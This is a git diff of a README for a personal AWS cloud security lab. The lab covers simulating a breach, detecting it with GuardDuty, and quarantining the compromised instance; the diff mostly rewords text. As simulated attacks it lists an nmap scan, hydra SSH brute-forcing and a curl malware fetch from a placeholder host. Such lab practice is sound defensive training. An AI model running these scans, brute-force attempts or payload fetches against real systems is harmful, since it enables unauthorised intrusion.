@@ -1,7 +1,10 @@
-# 🛡️ AWS Cloud SOC Lab: Simulating a Cloud Breach and Response
+# ☁️ AWS Cloud SOC Detection Engineering Lab
 
 ## 📌 Overview
-This project is a hands-on simulation of a cloud security incident in AWS, built to practice infrastructure automation, attack simulation, and incident response. I automated the creation of an AWS environment, simulated malicious activity, detected threats with GuardDuty, and performed manual containment like a SOC analyst. All work was done in a fully isolated AWS environment using Kali Linux.
+This project is a hands-on simulation of a cloud security incident in AWS, built to practice infrastructure automation, attack simulation, and incident response. I automated the creation of an AWS environment, simulated malicious activity, detected threats with GuardDuty, and performed manual containment just like a SOC analyst. All work was done in a fully isolated AWS environment using Kali Linux.
+
+📁 Full project documentation with all screenshots and commands:  
+👉 [documenting.md](https://github.com/jmcoded0/AWS-Cloud-SOC-Detection-Engineering-Lab/blob/main/documenting.md)
 
 ## 🎯 Project Goals
 - Automate AWS infrastructure (VPC, EC2, security groups) using Python and Boto3.
@@ -32,36 +35,35 @@ This project is a hands-on simulation of a cloud security incident in AWS, built
   - Port scans: `nmap -sS 1.1.1.1`
   - SSH brute-force: `hydra`
   - Fake malware downloads: `curl http://badhost.com/malware`
-- Triggered GuardDuty’s malware scan (`/aws/guardduty/malware-scan-events`).
+- Triggered GuardDuty malware detection events (`/aws/guardduty/malware-scan-events`).
 - **Lesson:** Even failed commands can trigger behavioral detections.
 
 ### ✅ Phase 5: Forensics and IOC Extraction
 - Analyzed GuardDuty findings:
   - `Recon:EC2/Portscan`
   - `Backdoor:EC2/DenialOfService.TorClient`
-- Extracted IOCs like:
+- Extracted IOCs such as:
   - IP: `1.1.1.1`
   - Port: `35`
   - Instance ID: `i-0bca611a4c23538c8`
-- Encountered CloudTrail permission issue (`cloudtrail:LookupEvents`).
+- Encountered CloudTrail permission error (`cloudtrail:LookupEvents`).
 - **Lesson:** IAM policies are critical gatekeepers.
 
 ### ✅ Phase 5.2: Manual Quarantine
 - Tagged the compromised EC2 instance with `Quarantine=True`.
 - Stopped the instance manually.
-- **Lesson:** Manual containment builds IR muscle memory.
+- **Lesson:** Manual containment builds real IR muscle memory.
 
 ### ✅ Phase 6: CloudTrail Analysis
 - Correlated GuardDuty findings with CloudTrail logs.
-- Investigated snapshot usage and log activity.
-- **Lesson:** Logs provide context for reconstructing incident timelines.
+- Investigated snapshot usage and event history.
+- **Lesson:** Logs provide crucial context for incident reconstruction.
 
 ## 💡 Key Lessons
-- Cloud security is tactical—requires real, hands-on AWS practice.
-- GuardDuty + CloudTrail give powerful visibility into threat activity.
-- Manual steps like tagging and stopping instances can be solid IR actions.
-- IAM permissions control your ability to investigate—don’t overlook them.
+- Cloud security is tactical—it requires real, hands-on AWS practice.
+- GuardDuty + CloudTrail offer deep visibility into threat activity.
+- Manual response steps (like tagging or stopping instances) are valid IR actions.
+- IAM permissions directly impact your ability to investigate.
 
-🙋 Reflections
-This project taught me how to think like a cloud security analyst—from building and misconfiguring infrastructure to simulating attacks and performing incident response. It’s a real-world, hands-on journey through AWS security tools like GuardDuty, CloudTrail, and IAM.
-
+## 🙋 Reflections
+This project taught me how to think like a cloud security analyst—from building and misconfiguring infrastructure, to simulating real attacks, investigating alerts, and responding manually. It was a full, hands-on journey through AWS security tools like GuardDuty, CloudTrail, and IAM.
